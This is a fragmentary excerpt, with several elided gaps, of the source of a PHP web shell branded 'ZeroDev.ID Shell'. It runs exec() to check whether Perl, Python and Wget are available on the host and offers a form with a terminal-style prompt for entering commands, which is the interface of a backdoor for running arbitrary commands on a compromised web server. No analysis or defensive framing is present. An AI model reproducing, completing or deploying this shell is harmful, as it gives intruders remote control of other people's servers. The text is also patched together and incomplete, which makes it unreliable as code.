...
<style>
  ...
  <body bgcolor="black">
	<center><h1><center><font color="#00BFFF" face="Rye">ZeroDev.ID Shell</font><br>
	</center>
	<form method="post">
...
<body style="background-color:#00C2FF;color:#fff;font-family:serif;">
...
?>
			...
			<li>Perl: <?= (exec('perl --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Python: <?= (exec('python --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
			<li>Wget: <?= (exec('wget --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
    ...
    <label for="cmd">lewster7@localhost:~$ </label>
